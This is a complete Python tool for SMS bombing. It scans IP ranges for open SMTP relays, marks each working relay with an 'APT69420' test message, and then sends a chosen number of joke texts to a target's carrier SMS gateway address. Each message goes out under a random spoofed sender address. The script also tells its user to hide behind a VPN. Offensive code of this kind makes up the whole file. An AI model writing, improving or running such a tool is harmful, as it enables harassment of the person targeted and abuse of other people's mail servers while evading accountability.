import logging
import string
import smtplib
import time
import random
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ipaddress
from termcolor import colored
import re
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import textwrap

logging.basicConfig(level=logging.DEBUG)

def validate_email(email):
    """Check if email address is valid."""
    email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
    return re.match(email_regex, email) is not None

def get_user_input():
    logging.debug("Entering get_user_input function")
    print(colored("\nWARNING: Make sure you're using a VPN.", 'red'))
    while True:
        target_email = input(colored("\nEnter target SMS email address (go to https://freecarrierlookup.com/ to find the correct email address for the phone number you want to target): ", 'yellow'))
        if validate_email(target_email):
            break
        else:
            print(colored("Invalid email address. Please try again.", 'red'))
    while True:
        try:
            text_amount = int(input(colored("Enter the number of messages to send: ", 'yellow')))
            if text_amount <= 0:
                print(colored("Please enter a positive number for the number of messages to send.", 'red'))
            else:
                break
        except ValueError:
            print(colored("Please enter a valid integer for the number of messages to send.", 'red'))
    while True:
        try:
            wait = int(input(colored("Enter the number of seconds to wait between messages: ", 'yellow')))
            if wait <= 0:
                print(colored("Please enter a positive number for the number of seconds to wait.", 'red'))
            else:
                break
        except ValueError:
            print(colored("Please enter a valid integer for the number of seconds to wait.", 'red'))
    while True:
        try:
            port = int(input(colored("Enter the SMTP port to use (typically 25, 465, or 587): ", 'yellow')))
            if port not in [25, 465, 587]:
                print(colored("Please enter a valid SMTP port number (25, 465, or 587).", 'red'))
            else:
                break
        except ValueError:
            print(colored("Please enter a valid integer for the SMTP port number.", 'red'))
    hostname_or_ip = input(colored(textwrap.fill("Enter hostname or IP address (with CIDR notation for range) to scan for open SMTP relay to use. For example, '192.168.0.0/24' will scan all IPs from 192.168.0.1 to 192.168.0.254. A range like '192.168.0.0/16' will scan from 192.168.0.1 to 192.168.255.254:", 97), 'yellow'))
    try:
        # Attempt to interpret as an IP network
        ip_network = ipaddress.ip_network(hostname_or_ip)
        hostnames = [str(ip) for ip in ip_network.hosts()]
    except ValueError:
        # If not an IP network, interpret as a single hostname
        hostnames = [hostname_or_ip]
    logging.debug("Exiting get_user_input function")
    return target_email, text_amount, wait, hostnames, port

def create_smtp_server(hostname, port):
    """Creates and returns an SMTP server."""
    try:
        logging.info(f"Creating SMTP server for {hostname} on port {port}")
        server = smtplib.SMTP(hostname, port)
        server.starttls()
        logging.info(f"Successfully created SMTP server for {hostname} on port {port}")
        return server
    except (socket.gaierror, socket.error, socket.herror, smtplib.SMTPException) as e:
        logging.error(f"Failed to create server for {hostname}: {e}", exc_info=True)
        return None
    except Exception as e:
        logging.critical(f"An unexpected error occurred while creating server for {hostname}: {e}", exc_info=True)
        return None

def random_string(length=10):
    """Generate a random string of fixed length."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def send_emails(server, target_email, text_amount, wait, messages):
    """Sends the specified number of messages to the target email address."""
    try:
        logging.info(f"Checking server connection for {server}")
        server.noop()
    except smtplib.SMTPException:
        logging.error("Server is not open. Exiting...")
        server.quit()
        return

    for i in range(text_amount):
        # generate a random "from" email address
        email_address = f"{random_string()}@{random_string()}.com"
        msg = random.choice(messages)
        try:
            logging.info(f"Sending message {i+1} to {target_email}")
            server.sendmail(email_address, target_email, msg)
            print(f"Message {i+1} sent.")
            time.sleep(wait)
        except smtplib.SMTPRecipientsRefused:
            logging.warning(f"Message {i+1} not sent. Recipient refused.")
            break
        except Exception as e:
            logging.error(f"Message {i+1} not sent. An unexpected error occurred: {e}", exc_info=True)
            break

    print(f"{i+1} texts sent or attempted.")
    server.quit()

def checker(hostname, port):
    print(f"Checking server {hostname}...")
    try:
        server = smtplib.SMTP(hostname, port, timeout=15)
        sender = 'apt69420@aol.com'  # updated line
        receiver = 'rocket@god.com'
        msg = MIMEMultipart('alternative')
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = 'Test'
        msg.attach(MIMEText('<h1>APT69420</h1><p>FTW</p>', 'html'))
        server.helo()
        text = msg.as_string()
        server.sendmail(sender, receiver, text)
        server.quit()
        print(f"Open SMTP relay found at {hostname}")
        return True
    except (socket.gaierror, socket.error, socket.herror, smtplib.SMTPException, TimeoutError) as e:
        logging.error(f"Failed to connect to server {hostname}. Error: {str(e)}")
        return False

def main():
    try:
        messages = [
            "This is Brad Charming. Remember to stay hydrated!",
            "Hi, it's Gloria Statesman. Don't forget to vote... for me!",
            "Ever thought about going vegan? Love, Gordon Greenleaf",
            "Tony Thrills here! Did you know I did all my own stunts in my latest film?",
            "This is Arthur Wordsmith. Remember, a book a day keeps ignorance away!",
            "Hey, it's Serena Fastfoot. Practice like you've never won, play like you've never lost!",
            "Ricky Riff here, keep rocking and have a great day!",
            "Hello, it's Nicola Powers. Remember, the universe is full of infinite possibilities!",
            "Astrid Starfield here! Did you know that space is completely silent?",
            "This is Phil Thinker. Have you ever thought about the meaning of life today?",
            "Hello, Indiana Traveller here! Adventure may hurt you, but monotony will kill you.",
            "Hey, it's Charlie Chuckles. Did you hear the joke about the... oh wait, I forgot the punchline!",
            "Pablo Paints here! Life is a great big canvas, throw all the paint you can at it.",
            "Hey, it's Oliver Oven! Remember, you don't need a silver fork to eat good food!",
            "Hello from Francesca Frames! Life is like a camera, focus on what's important, capture good times, develop from the negatives, and if things don't work out, take another shot!",
            "Hey there, it's Melody Notes. Music is the strongest form of magic!",
            "Hi, Stephen Beaker here! Science never solves a problem without creating ten more.",
            "Hey, it's Wendy Words. You can always edit a bad page. You can't edit a blank page.",
            "Penelope Prose here! Poetry is when an emotion has found its thought and the thought has found words.",
            "Hey, it's Amelia Skies! The engine is the heart of an airplane, but the pilot is its soul.",
            "This is Brad Charming. Remember, you don't have to brush all your teeth, just the ones you want to keep!",
            "Hi, it's Gloria Statesman. If at first you don't succeed, so much for skydiving!",
            "Ever thought about not doing anything at all? Love, Gordon Greenleaf",
            "Tony Thrills here! Did you know that nothing is foolproof to a sufficiently talented fool?",
            "Arthur Wordsmith here! Why don't scientists trust atoms? Because they make up everything!",
            "Hey, it's Serena Fastfoot. Did you hear about the mathematician who's afraid of negative numbers? He will stop at nothing to avoid them!",
            "Ricky Riff here, remember to smile. It confuses people!",
            "Hello, it's Nicola Powers. If I had a penny for every time I got distracted, I wish I had some ice cream!",
            "Astrid Starfield here! My fake plants died because I did not pretend to water them!",
            "Phil Thinker asking, if a turtle doesn't have a shell, is it homeless or naked?",
            "Indiana Traveller here! If you think nobody cares whether you're alive, try missing a couple of car payments.",
            "Hey, it's Charlie Chuckles. Two antennas met on a roof, fell in love and got married. The wedding wasn't much, but the reception was excellent!",
            "Pablo Paints here! Remember, art is not a thing; it is a way!",
            "Hey, it's Oliver Oven. Did you hear about the restaurant on the moon? Great food, but no atmosphere!",
            "Francesca Frames here! I changed my password to 'incorrect.' So whenever I forget, it will tell me, 'Your password is incorrect.'",
            "Melody Notes here! Do you know what's really odd? Numbers not divisible by 2!",
            "Hi, Stephen Beaker here! Why can't you trust an atom? Because they make up literally everything.",
            "Wendy Words here! My internet is so slow, it's just faster to drive to the Google headquarters and ask them stuff in person.",
            "Penelope Prose here! I told my wife she should embrace her mistakes... She gave me a hug.",
            "Amelia Skies here! What do you do when you see a spaceman? You park, man.",
            "This is Horace Healthnut. Ever tried to eat a clock? It's time-consuming!",
            "Hi, it's Priscilla Politica. I used to be a baker, but I couldn't make enough dough!",
            "Ever thought about gravity? It's not just a good idea, it's the law! Love, Steve Skygazer",
            "Tommy Turbo here! Did you know I was a car in my past life? I can't explain it, I just feel this deep connection with roads.",
            "Dexter Booksmart here! Why don't we ever tell secrets on a farm? Because the potatoes have eyes, the corn has ears, and the beans stalk!",
            "Hey, it's Gabby Gamepoint. I used to play piano by ear, but now I use my hands.",
            "Rita Rhythm here! Why don't secret agents sleep? Because they don't want to be caught napping!",
            "Hello, it's Petra Petrologist. You know what rocks? Geology!",
            "Astro Adams here! I'm reading a book about anti-gravity. It's impossible to put down!",
            "Polly Puzzler here! Why don't scientists trust atoms? Because they make up everything!",
            "Indiana Bones here! Archaeology: It's the only career where you can't avoid the skeletons in your closet.",
            "Hey, it's Chuck Chuckler. Why don't scientists trust atoms? Because they make up everything!",
            "Palette Pete here! Art doesn't transform. It just plain forms.",
            "Hey, it's Olive Ovenbake. Why did the tomato turn red? Because it saw the salad dressing!",
            "Frannie Filmroll here! Editing is everything. Cut until you can cut no more.",
            "Melvin Musicnote here! What's Beethoven's favorite fruit? Ba-na-na-naa!",
            "Hi, Sheila Science here! Why can't you trust an atom? Because they make up literally everything.",
            "Wanda Wordsmith here! How does Moses make his tea? Hebrews it.",
            "Penny Poet here! Why was the math book sad? Because it had too many problems.",
            "Amelia Aeronaut here! You know why I don't trust stairs? They're always up to something.",
            "This is Harry Highflyer. If I had a dollar for every time I lost at the casino, I'd have 0 dollars.",
            "Hi, it's Vivian Veggie. I asked the gym instructor if he could teach me to do the splits. He replied, 'How flexible are you?' I said, 'I can't make Tuesdays.'",
            "Did you hear about the guy whose whole left side was cut off? He's all right now. Love, Dr. Adam Ailment",
            "Stella Stunts here! I find it ironic that the colors red, white, and blue stand for freedom until they are flashing behind you.",
            "This is Bernard Bookworm. Why don't some couples go to the zoo? Because they are seeing enough cheetahs at home!",
            "Hey, it's Grace Gamechanger. My wife told me I should do lunges to stay in shape. That would be a big step forward.",
            "Rita Rockstar here, I told my wife she was drawing her eyebrows too high. She seemed surprised.",
            "Hello, it's Paul Petrology. I got a job at a bakery because I kneaded dough.",
            "Astro Armstrong here! I used to work in a shoe recycling shop. It was sole destroying!",
            "This is Penny Puzzle. I, for one, like Roman numerals.",
            "Indiana Digger here! Archaeologists are the best husbands. They appreciate you more the older you get.",
            "Hey, it's Charming Chuck. Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them!",
            "Peter Palette here! Art is a hobby of mine, but I can draw a line under it when I need to.",
            "Hey, it's Orville Oven. The first time I got a universal remote control, I thought to myself, 'This changes everything.'",
            "Frida Film here! I told my girlfriend she drew her eyebrows too high. She seemed surprised.",
            "Melody Note here! What's Beethoven's favorite fruit? Ba-na-na-naa!",
            "Hi, Science Sarah here! Why can't you trust an atom? Because they make up literally everything.",
            "Whitney Writer here! I have a joke about time travel, but I'm not sure you'd get it...",
            "Penny Poet here! Why was the math book sad? Because it had too many problems.",
            "Amy Aviator here! You know why I don't trust stairs? They're always up to something.",
            "This is Harry Haywire. I told my wife she should embrace her mistakes. She gave me a hug.",
            "Hi, it's Valerie Veggies. If I got 50 cents for every failed math exam, I'd have $6.30 now.",
            "You know, I'm not lazy. I'm just in energy-saving mode. Love, Sluggish Sally",
            "Stan Stuntman here! My wife just found out I replaced our bed with a trampoline; she hit the roof.",
            "This is Benjamin Bookworm. I'm reading a book about anti-gravity. It's impossible to put down!",
            "Hey, it's Gracie Gamechanger. I have a fear of speed bumps, but I'm slowly getting over it.",
            "Rita Rockstar here, I used to be indecisive. Now, I'm not so sure.",
            "Hello, it's Peter Petrology. The fact that there's a highway to hell and only a stairway to heaven says a lot about anticipated traffic numbers.",
            "Astro Armstrong here! I find it ironic that the colors red, white, and blue stand for freedom until they are flashing behind you.",
            "This is Puzzling Penelope. I used to think I was indecisive, but now I'm not too sure.",
            "Indiana Digger here! I don't trust stairs because they're always up to something.",
            "Hey, it's Charming Chuck. Whoever invented knock-knock jokes should get a no-bell prize!",
            "Peter Palette here! My wife told me I should do lunges to stay in shape. That would be a big step forward.",
            "Hey, it's Orville Oven. I don't play soccer because I enjoy the sport. I'm just doing it for kicks!",
            "Frida Film here! When life gives you melons, you might be dyslexic.",
            "Melody Note here! Why don't scientists trust atoms? Because they make up everything!",
            "Hi, Science Sarah here! Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
            "Whitney Writer here! I used to be a baker, but I couldn't make enough dough.",
            "Penny Poet here! Time flies like an arrow; fruit flies like a banana.",
            "Amy Aviator here! You know why I don't trust stairs? They're always up to something."
        ]

        target_email, text_amount, wait, hostnames, port = get_user_input()
        found_server = None
        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_hostname = {executor.submit(checker, hostname, port): hostname for hostname in hostnames}
            try:
                for future in concurrent.futures.as_completed(future_to_hostname):
                    hostname = future_to_hostname[future]
                    try:
                        if future.result():
                            found_server = hostname
                            break
                    except Exception as exc:
                        print('%r generated an exception: %s' % (hostname, exc))
            except KeyboardInterrupt:
                print("\nProgram terminated by user. Exiting...")
                executor.shutdown(wait=False)
                return
        if found_server is not None:
            server = create_smtp_server(found_server, port)
            if server is not None:
                send_emails(server, target_email, text_amount, wait, messages)
        else:
            print("No open SMTP server found in the provided range.")
    except KeyboardInterrupt:
        print("\nProgram terminated by user. Exiting...")
    except ImportError as e:
        logging.error(f"Failed to import module: {e}", exc_info=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}", exc_info=True)
    finally:
        if 'server' in locals():
            server.quit()
            
if __name__ == "__main__":
    logging.debug("Starting script")
    main()
    logging.debug("Script finished")